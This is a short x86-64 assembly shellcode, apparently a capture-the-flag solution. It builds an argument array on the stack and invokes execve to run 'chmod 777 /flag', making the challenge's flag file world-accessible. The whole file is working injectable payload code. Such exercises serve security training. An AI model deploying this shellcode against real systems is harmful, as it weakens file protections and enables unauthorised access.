.intel_syntax noprefix

.section .text
.global _start

_start:

    # execve("/bin/chmod", {"/bin/chmod", "777", "/flag", NULL}, NULL)
    lea rdi, [rip+44] # cmd
    
    xor rax, rax
    push rax
    lea rax, [rip+48] # flag
    push rax
    lea rax, [rip+36] # perm
    push rax
    lea rax, [rip+18] # cmd
    push rax
    
    lea rsi, [rsp]

    xor rdx, rdx
    mov rax, 59
    syscall

    cmd: .ascii "/bin/chmod"
    .byte 0x00
    perm: .ascii "777"
    .byte 0x00
    flag: .ascii "/flag"
    .byte 0x00
